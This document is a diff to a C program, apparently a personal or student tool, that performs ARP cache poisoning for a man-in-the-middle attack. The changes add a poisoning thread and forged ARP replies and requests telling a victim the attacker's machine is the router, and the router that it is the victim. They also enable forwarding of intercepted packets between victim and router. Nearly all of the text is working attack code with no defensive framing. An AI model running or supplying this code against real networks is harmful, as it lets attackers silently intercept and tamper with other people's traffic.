@@ -4,7 +4,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-
+#include <pthread.h>
 #include <string.h> // for eth_pack_hdr which uses memmove
 
 #ifdef DNET_NAME
@@ -17,7 +17,13 @@
 
 extern pcap_t *handle;
 extern eth_addr_t my_mac_addr;
+extern eth_addr_t victim_mac_addr;
+ip_addr_t router_ip_addr;
+ip_addr_t my_ip_addr;
+ip_addr_t victim_ip_addr;
 
+unsigned char startup = 1;
+pthread_t po_thread;
 
 struct arp_response {
 	struct eth_hdr ethernet_header;
@@ -36,12 +42,12 @@ void arp_answer(eth_addr_t victim_mac, uint8_t *victim_ip, uint8_t *router_ip) {
 	victim_ip2 = *(uint32_t *)victim_ip;
 	router_ip2 = *(uint32_t *)router_ip;
 
-	printf("victim_ip2 : %02hhX %02hhX %02hhX %02hhX\n", *(uint8_t *)&victim_ip2, *((uint8_t *)&victim_ip2 + 1), *((uint8_t *)&victim_ip2 + 2), *((uint8_t *)&victim_ip2 + 3));
-	printf("router_ip2 : %02hhX %02hhX %02hhX %02hhX\n", *(uint8_t *)&router_ip2, *((uint8_t *)&router_ip2 + 1), *((uint8_t *)&router_ip2 + 2), *((uint8_t *)&router_ip2 + 3));
+//	printf("victim_ip2 : %02hhX %02hhX %02hhX %02hhX\n", *(uint8_t *)&victim_ip2, *((uint8_t *)&victim_ip2 + 1), *((uint8_t *)&victim_ip2 + 2), *((uint8_t *)&victim_ip2 + 3));
+//	printf("router_ip2 : %02hhX %02hhX %02hhX %02hhX\n", *(uint8_t *)&router_ip2, *((uint8_t *)&router_ip2 + 1), *((uint8_t *)&router_ip2 + 2), *((uint8_t *)&router_ip2 + 3));
 
 	eth_pack_hdr(&packet.ethernet_header, victim_mac, my_mac_addr, ETH_TYPE_ARP);
 	arp_pack_hdr_ethip(&packet.arp_header, ARP_OP_REPLY, my_mac_addr, router_ip2, victim_mac, victim_ip2);
-	
+
 	ret = pcap_sendpacket(handle, (u_char *)&packet, sizeof(struct arp_response));
 	if (ret < 0) {
 		printf("ERROR : failed to send the forged arp answer !\n");
@@ -80,19 +86,24 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	struct eth_hdr eth_pack;
 	eth_addr_t router_mac_addr;
 	uint16_t type;
-	ip_addr_t router_ip_addr;
-	ip_addr_t my_ip_addr;
 	char *my_ip_string;
 	char *arguments = strdup((char *)args);
 	char *ip_router_string;
 	char *mac_router_string;
-	char *my_mac;
+	char *my_mac_string;
+	char *victim_ip_string;
+	char *victim_mac_string;
+	eth_addr_t null_addr;
+
+	memset(&null_addr, 0x0, ETH_ADDR_LEN);
 
 	// We retrieve the mac & ip address of the router (as strings)
 	ip_router_string = strtok(arguments, ";");
 	mac_router_string = strtok(NULL, ";");
-	my_mac = strtok(NULL, ";");
 	my_ip_string = strtok(NULL, ";");
+	my_mac_string = strtok(NULL, ";");
+	victim_ip_string = strtok(NULL, ";");
+	victim_mac_string = strtok(NULL, ";");
 
 	if (ip_router_string == NULL) {
 		printf("ip_router_string == NULL\n");
@@ -104,7 +115,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		exit(1);
 	}
 
-	if (my_mac == NULL) {
+	if (my_mac_string == NULL) {
 		printf("my_mac == NULL\n");
 		exit(1);
 	}
@@ -114,11 +125,26 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		exit(1);
 	}
 
+	if (victim_ip_string == NULL)
+	{
+		printf("victim_ip_string == NULL\n");
+		exit(1);
+	}
+
+	if (victim_mac_string == NULL)
+	{
+		printf("victim_mac_string == NULL\n");
+		exit(1);
+	}
+
 	// We translate the strings into real addresses
 	string_to_mac_addr(mac_router_string, &router_mac_addr);
 	string_to_ip_addr(ip_router_string, &router_ip_addr);
-	string_to_mac_addr(my_mac, &my_mac_addr);
+	string_to_mac_addr(my_mac_string, &my_mac_addr);
 	string_to_ip_addr(my_ip_string, &my_ip_addr);
+	string_to_ip_addr(victim_ip_string, &victim_ip_addr);
+
+	free(arguments);
 
 	// We fill the eth_pack struct with the ethernet header of our packet
 	memcpy(&eth_pack, packet, sizeof(struct eth_hdr));
@@ -127,11 +153,24 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 //	type = eth_pack.eth_type >> 8;
 //	type |= eth_pack.eth_type << 8;
 
-	printf("src : ");
+/*	printf("src : ");
 	print_mac_address(eth_pack.eth_src);
 	printf(" ; dst : ");
 	print_mac_address(eth_pack.eth_dst);
 	printf(" ; type : %04X\n", type);
+*/
+
+	if (startup)
+	{
+		int err;
+		err = pthread_create(&po_thread, NULL, poisoning_thread, NULL);
+		if (err != 0)
+		{
+			printf("Error creating the poisoning thread : %d\n", err);
+			exit(1);
+		}
+		startup = 0;
+	}
 
 	if (type == ETH_TYPE_ARP) {
 		struct arp_hdr arp_header;
@@ -143,32 +182,40 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 
 		opcode = ntohs(arp_header.ar_op);
 
-		target_ip_addr = ntohl(*(uint32_t *)arp_payload.ar_tpa);
+		target_ip_addr = ntohl(*(uint32_t *)(arp_payload.ar_tpa));
 //		printf("\ntarget_ip_addr = 0x%08X\n", target_ip_addr);
 //		printf("\nrouter_id_addr = 0x%08X\n", router_ip_addr);
 
-		printf("\t[ARP (opcode = 0x%04X) detected]\n", opcode);
+//		printf("\t[ARP (opcode = 0x%04X) detected]\n", opcode);
 		// if it's a request from the victim to get the router mac addr
 		if ( (memcmp(&router_ip_addr, &target_ip_addr, IP_ADDR_LEN) == 0) && (opcode == ARP_OP_REQUEST) ) {
-			printf("\t\t[Intercepted ARP request for the Router] we gotta answer !\n\n");
+//			printf("\t\t[Intercepted ARP request for the Router] we gotta answer !\n\n");
+			printf("+");
 			// we answer our mac addr to the victim, we tell him we are the router
 			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
+			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
 			// we ask the victim what is it's mac addr, saying we are the router
-			//arp_request(eth_pack.eth_src, arp_payload.ar_spa, my_mac_addr, router_ip_addr);
+			arp_request(eth_pack.eth_src, my_mac_addr, my_mac_addr, ntohl(router_ip_addr), null_addr, *(uint32_t *)arp_payload.ar_spa);
 			// we ask the router his mac addr, saying we are the victim
-			//arp_request();
+			arp_request(router_mac_addr, my_mac_addr, my_mac_addr, *(uint32_t *)arp_payload.ar_spa, null_addr, ntohl(router_ip_addr));
 
 		}
-	} /*else if (type == ETH_TYPE_IP) {
+	} else if (type == ETH_TYPE_IP) {
 		struct ip_hdr ip_header;
 		memcpy(&ip_header, packet + sizeof(struct eth_hdr), sizeof(struct ip_hdr));
 
 		if ((memcmp(my_mac_addr.data, eth_pack.eth_dst.data, ETH_ADDR_LEN) == 0) && (ip_header.ip_dst != my_ip_addr)) {
-			if (memcmp(eth_pack.eth_src.data, router_mac_addr.data, ETH_ADDR_LEN) != 0) 
+			printf("On va devoir forward !\n");
+			if (memcmp(eth_pack.eth_src.data, router_mac_addr.data, ETH_ADDR_LEN) != 0) {
+				printf("On forward vers le routeur\n");
 				forward(packet, header->len, router_mac_addr);
+			} else {
+				printf("On forward vers la victime\n");
+				forward(packet, header->len, victim_mac_addr);
+			}
 		}
 
-	}*/
+	}
 
 
 }
